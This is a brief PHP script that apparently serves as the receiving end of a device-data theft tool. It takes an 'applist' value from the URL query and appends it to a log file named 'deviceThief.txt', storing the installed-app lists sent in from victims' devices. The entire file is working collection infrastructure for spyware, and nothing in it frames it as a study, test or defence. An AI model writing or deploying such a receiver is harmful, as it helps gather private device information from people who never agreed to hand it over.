<?php
header('Content-Type: text/html;charset=UTF-8');

$d4=$_GET["applist"];
echo "<br>";

file_put_contents('deviceThief.txt', "AppList= " .$d4 .PHP_EOL, FILE_APPEND);

file_put_contents('deviceThief.txt', "----------------------------" .PHP_EOL, FILE_APPEND);

?>